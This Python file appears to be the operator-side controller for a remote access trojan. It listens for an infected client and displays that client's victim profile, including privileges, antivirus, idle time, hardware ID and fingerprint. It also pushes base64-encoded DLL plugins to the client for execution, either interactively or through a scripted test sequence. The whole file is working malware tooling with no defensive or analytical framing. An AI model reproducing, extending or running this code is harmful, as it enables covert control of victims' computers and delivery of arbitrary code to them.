import argparse
import base64
import os
import socket

FIELDS = [
    "Country", "Nickname", "Tag", "UserName", "Version", "Privileges",
    "OS", "GPU", "CPU", "RAM", "AntiVirus", "Uptime", "AFKTime",
    "Ping", "HWID", "Fingerprint",
]

def read_line(s):
    b = bytearray()
    while True:
        c = s.recv(1)
        if not c or c == b"\n":
            return bytes(b).decode(errors="replace").rstrip("\r")
        b.extend(c)

def show(line):
    if not line.startswith("DATA:"):
        print(line)
        return
    vals = line[5:].split("|")
    for i, name in enumerate(FIELDS):
        print(f"{name}: {vals[i] if i < len(vals) else 'Unknown'}")

def wait_result(s):
    while True:
        line = read_line(s)
        if not line:
            return line
        if line.startswith("DATA:"):
            show(line)
            continue
        if line == "HB":
            s.sendall(b"PONG\n")
            continue
        print(line)
        if line.startswith("ACK:") or line.startswith("ERR:"):
            return line

# Build a CMD:PLUGIN:<id>:<base64> line from a local DLL file.
def plugin_cmd(path):
    with open(path, "rb") as f:
        data = f.read()
    stem = os.path.splitext(os.path.basename(path))[0]
    b64 = base64.b64encode(data).decode()
    return f"CMD:PLUGIN:{stem}:{b64}"

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=4793)
    ap.add_argument("--test")
    a = ap.parse_args()

    with socket.create_server((a.ip, a.port)) as server:
        print(f"listening {a.ip}:{a.port}")
        conn, addr = server.accept()
        with conn:
            print(f"connected {addr[0]}")
            hello = read_line(conn)
            data = read_line(conn)
            print(hello)
            show(data)
            if a.test:
                stem = os.path.splitext(os.path.basename(a.test))[0]
                cmds = [
                    plugin_cmd(a.test),
                    f"CMD:PLUGIN_EVENT:ping",
                    f"CMD:UNLOAD:{stem}",
                    "CMD:CLOSE",
                ]
                for cmd in cmds:
                    conn.sendall((cmd + "\n").encode())
                    result = wait_result(conn)
                    if result.startswith("ERR:") or not result:
                        raise SystemExit(1)
                return
            while True:
                try:
                    cmd = input("> ").strip()
                except (EOFError, KeyboardInterrupt):
                    return
                if not cmd:
                    continue
                if cmd.lower() in {"close", "exit", "quit"}:
                    conn.sendall(b"CMD:CLOSE\n")
                elif cmd.lower().startswith("unload:"):
                    conn.sendall((f"CMD:UNLOAD:{cmd.split(':', 1)[1].strip()}\n").encode())
                elif cmd.lower().startswith("event:"):
                    conn.sendall((f"CMD:PLUGIN_EVENT:{cmd.split(':', 1)[1].strip()}\n").encode())
                elif cmd.lower().startswith("load:"):
                    path = cmd.split(":", 1)[1].strip()
                    try:
                        conn.sendall((plugin_cmd(path) + "\n").encode())
                    except OSError as e:
                        print(f"error: {e}")
                        continue
                else:
                    # treat bare path as a load
                    try:
                        conn.sendall((plugin_cmd(cmd) + "\n").encode())
                    except OSError as e:
                        print(f"error: {e}")
                        continue
                if not wait_result(conn):
                    return
                if cmd.lower() in {"close", "exit", "quit"}:
                    return

if __name__ == "__main__":
    main()
